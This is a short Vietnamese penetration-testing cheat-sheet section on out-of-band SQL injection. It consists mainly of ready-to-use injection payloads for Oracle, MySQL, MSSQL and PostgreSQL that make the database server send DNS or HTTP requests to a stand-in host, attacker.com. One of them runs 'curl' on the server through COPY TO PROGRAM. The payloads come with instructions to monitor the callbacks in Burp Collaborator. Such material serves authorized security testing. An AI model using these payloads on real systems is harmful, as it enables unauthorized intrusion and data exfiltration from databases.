### Out-of-band SQLi
**Out-of-band SQLi:** là một loại tấn công SQL trong đó kẻ tấn công không nhận được phản hồi từ ứng dụng bị tấn công trên cùng một kênh giao tiếp mà thay vào đó có thể khiến ứng dụng gửi dữ liệu đến điểm cuối từ xa mà chúng kiểm soát.

Out-of-band SQL chỉ có thể thực hiện được nếu máy chủ bạn đang sử dụng có các lệnh kích hoạt yêu cầu DNS hoặc HTTP. Tuy nhiên, đó là trường hợp của tất cả các máy chủ SQL phổ biến.

**Payload:** 
```
Oracle: 
'; BEGIN UTL_HTTP.REQUEST('http://attacker.com'); END;-- (requires UTL_HTTP)

MySQL: 
'; SELECT LOAD_FILE(CONCAT('\\\\', 'test', '.attacker.com\\a'))--

MSSQL: 
'; EXEC master..xp_dirtree '//attacker.com/a'--

PostgreSQL: 
'; COPY (SELECT '') TO PROGRAM 'curl attacker.com'-- (requires perms)
```

**Hành động:** Chèn và theo dõi Burp Collaborator hoặc máy chủ DNS/HTTP tùy chỉnh. 

**Mong đợi:**  Tra cứu DNS hoặc yêu cầu HTTP tới attacker.com. 

**Mục tiêu:** Xác nhận SQLi có khả năng OOB để khai thác nâng cao. 